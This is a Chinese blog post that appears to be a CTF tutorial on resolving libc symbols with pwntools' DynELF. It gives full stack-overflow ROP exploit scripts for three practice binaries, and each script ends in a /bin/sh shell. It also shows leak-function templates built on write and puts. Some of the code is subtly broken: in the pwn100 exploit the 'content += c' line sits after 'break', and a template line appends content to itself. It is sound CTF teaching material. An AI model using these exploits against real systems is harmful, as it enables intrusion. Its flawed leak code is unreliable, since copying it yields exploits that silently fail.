<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>利用DynElf模块完成获取libc信息 ~ Welcome to Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Welcome to Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" false
         style="background: url('/img/default.png')no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期六, 二月 15日 2020, 4:54 下午
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    2.6k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      11 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="利用DynElf模块完成获取libc信息"><a href="#利用DynElf模块完成获取libc信息" class="headerlink" title="利用DynElf模块完成获取libc信息"></a>利用DynElf模块完成获取libc信息</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。</p>
<h2 id="Dynelf"><a href="#Dynelf" class="headerlink" title="Dynelf"></a>Dynelf</h2><p>解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释）</p>
<h3 id="基本使用框架："><a href="#基本使用框架：" class="headerlink" title="基本使用框架："></a>基本使用框架：</h3><pre><code>io = remote(ip, port)
def leak(addr):
    payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot;
    io.send(payload)
    data = io.recv()
    #debug用的
    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))
    return data
#初始化DynELF模块 
d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)
system_addr = d.lookup(“system”, &#39;libc&#39;)</code></pre><p>其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。<strong>正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols</strong>。</p>
<p>且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。</p>
<h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p>
<ul>
<li>目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</li>
<li>目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</li>
</ul>
<p>以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p>
<h3 id="使用write函数来泄露"><a href="#使用write函数来泄露" class="headerlink" title="使用write函数来泄露"></a>使用write函数来泄露</h3><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p>
<p>其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。</p>
<h4 id="万能gadget"><a href="#万能gadget" class="headerlink" title="万能gadget"></a>万能gadget</h4><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817628590359.jpg" srcset="/img/loading.gif" alt="-w817"><br>这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的<code>pop rbx</code>的地址，然后看下栈如何来布置：<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817631112375.jpg" srcset="/img/loading.gif" alt="-w486"><br>（其中为什么填入got地址，是因为接下来ret到<code>mov rdx,r13</code>后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）<br>在第一段pop 后ret地址要填入<code>mov rdx,r13</code>的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817633402017.jpg" srcset="/img/loading.gif" alt="-w259"><br>所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。</p>
<h4 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013 ropasaurusrex"></a>PlaidCTF 2013 ropasaurusrex</h4><h5 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>   Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>ssize_t sub_80483F4()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &amp;buf, 0x100u);
}</code></pre><p>函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *
io = process(&#39;./ropasaurusrex&#39;)
elf = ELF(&#39;./ropasaurusrex&#39;)
buf = 0x8049620
padding = 140
write_add = elf.symbols[&#39;write&#39;]
start_addr = 0x08048340

def leak(addr):
    p = &#39;&#39;
    p += padding * &#39;a&#39;
    p += p32(write_add)
    p += p32(start_addr)
    p += p32(1)
    p += p32(addr)
    p += p32(0x4)
    io.sendline(p)
    content = io.recv(4)
    # print(&quot;%x -&gt; %s&quot; %(addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))
    return content

d = DynELF(leak,elf=elf)
system_add = d.lookup(&#39;system&#39;,&#39;libc&#39;)
read_add = d.lookup(&#39;read&#39;,&#39;libc&#39;)
log.info(&quot;system_add = %x&quot;, system_add)
log.info(&quot;read_add = %x&quot;, read_add)
p = padding * &#39;a&#39; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8)
io.sendline(p)
io.sendline(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre><h4 id="Jarvis-oj-leave4"><a href="#Jarvis-oj-leave4" class="headerlink" title="Jarvis_oj_leave4"></a>Jarvis_oj_leave4</h4><h5 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &#39;/media/psf/mypwn2/jarvis_OJ/level4/level4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817716059093.jpg" srcset="/img/loading.gif" alt="-w420"></p>
<pre><code>ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  return read(0, &amp;buf, 0x100u);
}</code></pre><p>漏洞函数，存在栈溢出。还是跟上题一样的思路。</p>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *
import time
# context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
# io = process(&#39;./level4&#39;)
io = remote(&#39;pwn2.jarvisoj.com&#39;,9880)
elf = ELF(&#39;./level4&#39;)
__libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]
write_plt = elf.symbols[&#39;write&#39;]
start_addr = 0x08048350
padding = 140

def leak(addr):
    payload = padding * &#39;a&#39; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4)
    io.sendline(payload)
    data = io.recv(4)
    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))

    return data
d = DynELF(leak,elf = elf)
system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)
info(&#39;system_addr = %#x&#39; %system_addr)
read_addr = d.lookup(&#39;read&#39;,&#39;libc&#39;)
info(&#39;read_addr = %#x&#39; %read_addr)
binsh_add = 0x804A01C
payload = padding * &#39;a&#39; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8)
io.sendline(payload)
sleep(0.1)
io.sendline(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre><h3 id="使用puts函数来泄露"><a href="#使用puts函数来泄露" class="headerlink" title="使用puts函数来泄露"></a>使用puts函数来泄露</h3><p>printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，<strong>puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点</strong>，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p>
<h4 id="针对缺点的改进办法"><a href="#针对缺点的改进办法" class="headerlink" title="针对缺点的改进办法"></a>针对缺点的改进办法</h4><h5 id="puts输出完后就没有其他输出"><a href="#puts输出完后就没有其他输出" class="headerlink" title="puts输出完后就没有其他输出"></a>puts输出完后就没有其他输出</h5><p>leak函数模板<br>    def leak(address):<br>      count = 0<br>      content = ‘’<br>      payload = xxx<br>      p.send(payload)<br>      print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出<br>      up = “”<br>      while True:<br>        c = p.recv(numb=1, timeout=0.1)<br>        count += 1<br>        if up == ‘\n’ and c == “”:  #接收到的上一个字符为回车符，而当前接收不到新字符，则<br>         content += content[:-1]  +’\x00’            #删除puts函数输出的末尾回车符<br>          break<br>        else:<br>          content += c<br>        up = c<br>      content = content[:4]  #取指定字节数<br>      log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’)))<br>      return content<br>其中<code>c = p.recv(numb=1, timeout=0.1)</code>由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</p>
<h5 id="puts输出完后还有其他输出"><a href="#puts输出完后还有其他输出" class="headerlink" title="puts输出完后还有其他输出"></a>puts输出完后还有其他输出</h5><pre><code>def leak(address):
  count = 0
  content = &quot;&quot;
  payload = xxx
  p.send(payload)
  print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出
  up = &quot;&quot;
  while True:
    c = p.recv(1)
    count += 1
    if up == &#39;\n&#39; and c == &quot;x&quot;:  #一定要找到泄漏信息的字符串特征
      content = content[:-1] + &quot;x00&quot;                  
      break
    else:
      content += c
    up = c
  content = content[:4] 
  log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &#39;&#39;).encode(&#39;hex&#39;)))
  return content</code></pre><h4 id="Lctf-2016-pwn100"><a href="#Lctf-2016-pwn100" class="headerlink" title="Lctf_2016_pwn100"></a>Lctf_2016_pwn100</h4><h5 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>int sub_40068E()
{
  char v1; // [rsp+0h] [rbp-40h]

  sub_40063D((__int64)&amp;v1, 200);
  return puts(&quot;bye~&quot;);
}

__int64 __fastcall sub_40063D(__int64 a1, signed int a2)
{
  __int64 result; // rax
  signed int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)i;
    if ( i &gt;= a2 )
      break;
    read(0, (void *)(i + a1), 1uLL);
  }
  return result;
}</code></pre><p>主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。</p>
<ol>
<li>因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。</li>
<li>第二次构造rop链的时候，用read函数读<code>system(/bin/sh)</code>到一个确定的地址，还是会到start处。</li>
<li>第三次构造时候，直接进行调用system函数的rop链即可。</li>
</ol>
<p>其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817725422726.jpg" srcset="/img/loading.gif" alt="-w820"></p>
<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code>#coding:utf-8
from pwn import *
context.arch = &#39;amd64&#39;
# context.log_level = &#39;info&#39;
io = process(&#39;./pwn100&#39;)
elf = ELF(&#39;./pwn100&#39;)
# libc = elf.libc
padding = 72
puts_plt = elf.plt[&#39;puts&#39;]
read_got = elf.got[&#39;read&#39;]
start_add = 0x000400550
pop_rdi = 0x400763
def leak(addr):
    payload = padding * &#39;a&#39; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)]
    payload = payload.ljust(200,&#39;b&#39;)
    io.send(payload)
    count = 0
    up = &#39;&#39;
    content = &#39;&#39;
    io.recvuntil(&#39;bye~\n&#39;) #一定要在puts前释放完输出
    while True:
        c = io.recv(numb=1, timeout=0.1)
        count += 1
        if up == &#39;\n&#39; and c == &quot;&quot;:  #接收到的上一个字符为回车符，而当前接收不到新字符，则
            content = content[:-1]  +&#39;\x00&#39;             #删除puts函数输出的末尾回车符
            break
            content += c
        else:
            up = c
    content = content[:4]  #取指定字节数
    log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))
    return content

d = DynELF(leak, elf = elf)
system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)
log.info(&#39;system_addr = %#x&#39; %system_addr)
binsh_addr = 0x601068 - 8

payload = padding * &#39;a&#39; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&#39;\x00&#39;*56,start_add])
payload = payload.ljust(200,&#39;b&#39;)
io.send(payload)
io.recvuntil(&#39;bye~\n&#39;)

io.send(&#39;/bin/sh\x00&#39;)
payload = padding * &#39;a&#39; + flat([pop_rdi,binsh_addr,system_addr])
payload = payload.ljust(200,&#39;b&#39;)
io.send(payload)
io.interactive()</code></pre><h3 id="其他获取libc的方法"><a href="#其他获取libc的方法" class="headerlink" title="其他获取libc的方法"></a>其他获取libc的方法</h3><p>虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：<br><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。</p>
<p>还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。</p>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
  
  <br>



    
  <!-- 备案信息 -->
  <a href="http://beian.miit.gov.cn/" target="_blank"
     rel="nofollow noopener">豫ICP备20003962号</a>
  
    <a
      href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=20003962"
      rel="nofollow noopener"
      class="police-beian"
      target="_blank"
    >
      <span class="police-beian-sep">&nbsp;|&nbsp;</span>
      
        <img src="/img/police_beian.png" srcset="/img/loading.gif" />
      
      <span>京公网安备12345678号</span>
    </a>
  



    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  <!-- cnzz Analytics -->
  



  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "利用DynElf模块完成获取libc信息&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  








</body>
</html>
